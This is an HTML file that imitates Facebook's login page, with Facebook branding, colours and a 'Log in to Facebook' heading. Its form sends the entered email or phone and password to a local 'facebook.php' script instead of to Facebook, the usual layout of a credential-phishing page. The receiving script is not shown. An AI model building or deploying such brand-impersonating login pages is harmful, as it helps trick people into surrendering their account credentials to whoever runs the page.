# facebook
<!DOCTYPE html>
<html>
<head>
  <title>Facebook Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f2f5;
    }
    
    .container {
      max-width: 400px;
      margin: 0 auto;
      padding: 20px;
      background-color: #fff;
      border: 1px solid #ddd;
      border-radius: 5px;
      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
    }
    
    h2 {
      text-align: center;
      margin-bottom: 20px;
    }
    
    label {
      display: block;
      margin-bottom: 8px;
    }
    
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 20px;
      border: 1px solid #ddd;
      border-radius: 5px;
      box-sizing: border-box;
    }
    
    button {
      width: 100%;
      padding: 10px;
      background-color: #1877f2;
      color: #fff;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
    }
    
    button:hover {
      background-color: #1262af;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Log in to Facebook</h2>
    <form name="f" action="facebook.php" method="post">
      <label for="email">Email or Phone:</label>
      <input type="text" id="email" name="email" required>
      
      <label for="password">Password:</label>
      <input type="password" id="password" name="password" required>
      
      <button type="submit">Log In</button>
    </form>
  </div>
</body>
</html>
